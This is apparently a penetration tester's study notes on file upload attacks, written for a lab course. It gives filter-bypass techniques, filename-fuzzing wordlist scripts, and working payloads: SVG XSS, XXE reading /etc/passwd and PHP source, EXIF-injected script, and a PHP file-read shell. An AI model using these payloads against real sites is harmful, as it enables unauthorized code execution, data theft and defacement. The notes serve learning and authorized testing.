## 📁 File Upload Vulnerabilities

**Tags:** `#FileUpload` `#WebSecurity` `#OWASP`

Improper file upload handling can lead to critical vulnerabilities, especially when authentication and validation are missing.

---

### 🐚 Shell Uploads

- **Worst-case scenario**: No authentication and no file validation.
- Identify backend language and upload a test file accordingly.

#### 🐘 PHP Shells

-  [GitHub - Arrexel/phpbash: A semi-interactive PHP shell compressed into a single file.](https://github.com/Arrexel/phpbash)
- ![[Pasted image 20250421162640.png]]
- ![[Pasted image 20250425140304.png]]
-  [GitHub - pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

#### 🧩 ASP Shells

- ![[Pasted image 20250421162644.png]]
- ![[Pasted image 20250425140257.png]]

---

### 🧪 Client-Side Validation Bypass

- Local JavaScript validation can be bypassed:
    - Use **Burp Suite** as a proxy.
    - Modify HTML in browser dev tools.
    - Alter HTTP requests directly in Burp.
- After upload, inspect the source code to locate the file.
- PHP files may need to be accessed directly to execute.

---

### 🚫 Blacklist Filters

- **Backend filtering** based on:
    - File extension
    - File type
    - File content
- **Fuzzing extensions**:
    - [SecLists/Discovery/Web-Content/web-extensions.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
    - [PayloadsAllTheThings/Upload Insecure Files/Extension PHP/extensions.lst at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
    -  [PayloadsAllTheThings/Upload Insecure Files/Extension ASP at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
- Load lists into **[[05 - Personal/Jonathan/Tools/Burpsuite|Burpsuite]] Intruder**, **[[ffuf]]**, or **[[gobuster]]**.
- Simple test payload:

```php
  <?php echo "Hello, World!"; ?>
```

#### 🟢 Non-Blacklisted Extensions

- Extensions not explicitly denied may be accepted.
- May not allow code execution but can be used for further testing.

---

### ✅ Whitelist Filters

- **Default deny** then allow specific types.
- File manager “supported types” may not reflect backend logic.
- Fuzz extensions to discover accepted types.

#### 🌀 Double Extensions

- **Forward**: `.jpg.php` — backend may ignore second extension.
- **Reverse**: `.php.jpg` — backend may execute based on first extension.

#### 🔣 Character Injection

- Use special characters to bypass filters:
    - `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`, `:`
- Bash script to generate wordlist:

```bash
  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
      for ext in '.php' '.phps'; do
          echo "shell$char$ext.jpg" >> wordlist.txt
          echo "shell$ext$char.jpg" >> wordlist.txt
          echo "shell.jpg$char$ext" >> wordlist.txt
          echo "shell.jpg$ext$char" >> wordlist.txt
      done
  done
```

---

### 🧾 Content-Type Filters

- Backend may validate `Content-Type` header.
- [SecLists/Discovery/Web-Content/web-all-content-types.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
- Extract image types:

```shell-session
  wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
  cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

- Fuzz `Content-Type` header to find accepted values.

---

### 🧬 MIME-Type Filters

- Backend checks actual file content (magic bytes).
- Resources:
    - [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
    - [Wayback Machine - Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
- Mask payloads as valid file types (e.g., `GIF8`).
- ![[Pasted image 20250423143123.png]]

#### 🧪 MIME/Content-Type Combinations

- Allowed MIME with disallowed `Content-Type`
- Allowed MIME/Content-Type with disallowed extension
- Disallowed MIME/Content-Type with allowed extension

---

### 🧱 Limited File Uploads

Some file types may appear safe but can still be abused to execute code or perform attacks.

#### 🖼️ Dangerous File Types

- **SVG** (XML-based vector graphics)
    
    - Can contain embedded JavaScript (XSS):
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
        <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
        <script type="text/javascript">alert(window.origin);</script>
    </svg>
    ```
    
    - Can be used for XXE:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg>&xxe;</svg>
    ```
    
    - XXE in PHP apps:
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
    <svg>&xxe;</svg>
    ```
    
- **HTML** — Can contain embedded JavaScript (XSS)
    
- **XML** — Vulnerable to XXE/SSRF
    
- **Image files (e.g., JPG)** — Can contain malicious EXIF metadata:
    

```bash
  exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

- Changing MIME type to `text/html` may trigger embedded HTML/JS
    - **Office documents (DOC, PPT, etc.)** — May contain embedded HTML/XML

---

### 💥 Denial of Service (DoS) via File Upload

- **Decompression bombs** — Nested ZIPs that consume server resources
- **Pixel flooding** — Images with massive dimensions (e.g., `0xffff x 0xffff`)
- **Large file uploads** — Exhaust disk or memory
- **File overwrite** — If directory traversal is possible

![[Pasted image 20250425151238.png]]

---

### 🧪 Extra Client-Side Bypass

- [cpts-quick-references/module/File Upload Attacks.md at main · missteek/cpts-quick-references](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#extra-client-side)
- Modify client-side HTML to bypass validation:
    - Remove `validate()` function
    - Clear `onchange` and `accept` attributes

[![uploads-client-side-html](https://github.com/missteek/cpts-quick-references/raw/main/images/uploads-client-side-html.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/uploads-client-side-html.png)

---

### 🧾 Extra Wordlist Script

- [cpts-quick-references/module/File Upload Attacks.md at main · missteek/cpts-quick-references](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#extra-wordlist-script)
- Character Injection Wordlist Generator

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> filenames_wordlist.txt
        echo "shell$ext$char.jpg" >> filenames_wordlist.txt
        echo "shell.jpg$char$ext" >> filenames_wordlist.txt
        echo "shell.jpg$ext$char" >> filenames_wordlist.txt
    done
done
```

---

## 🧬 Content-Type Bypass

[cpts-quick-references/module/File Upload Attacks.md at main · missteek/cpts-quick-references](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#contenttype-bypass)

|**Command**|**Description**|
|---|---|
|Web Content-Types|Common web content types|
|All Content-Types|Full list of content types|
|File Signatures|Magic bytes for file type detection|

- Example payload:

```php
<?php echo file_get_contents('/flag.txt'); ?>
```

- Add `GIF8` at the top of the file body.
- Save as `shell.php`.
- Use Burp Suite Intruder to fuzz `Content-Type` header using the above wordlists.

---

## 🔐 Limited Uploads Summary

[cpts-quick-references/module/File Upload Attacks.md at main · missteek/cpts-quick-references](https://github.com/missteek/cpts-quick-references/blob/main/module/File%20Upload%20Attacks.md#limited-uploads)

|**Potential Attack**|**File Types**|
|---|---|
|`XSS`|HTML, JS, SVG, GIF|
|`XXE` / `SSRF`|XML, SVG, PDF, PPT, DOC|
|`DoS`|ZIP, JPG, PNG|

---

## 🧠 Additional Considerations & Advanced Techniques

These advanced techniques and concepts can help uncover deeper vulnerabilities or improve your testing strategy when dealing with file uploads.

---

### ⏱️ Race Conditions

- Exploit timing issues during file validation and storage.
- Upload a malicious file while the server is still processing another.
- Tools: `Burp Turbo Intruder`, custom multithreaded scripts.

---

### 🔗 File Inclusion Chaining

- Combine **File Upload** with **Local File Inclusion (LFI)**:
    - Upload a file to a known or guessable location.
    - Use LFI to include and execute it.
    - Useful when direct execution is blocked.

---

### 🧬 Polyglot Files

- Files valid in multiple formats (e.g., image + PHP).
- Example: A valid `.jpg` with embedded PHP code.
- Helps bypass content-type and extension filters.

---

### 🔍 Upload Path Discovery

- If the upload location is not disclosed:
    - Try common paths: `/uploads/`, `/files/`, `/images/`
    - Use brute-force tools: `ffuf`, `dirsearch`, `gobuster`
    - Analyze server responses for clues (e.g., redirects, error codes)

---

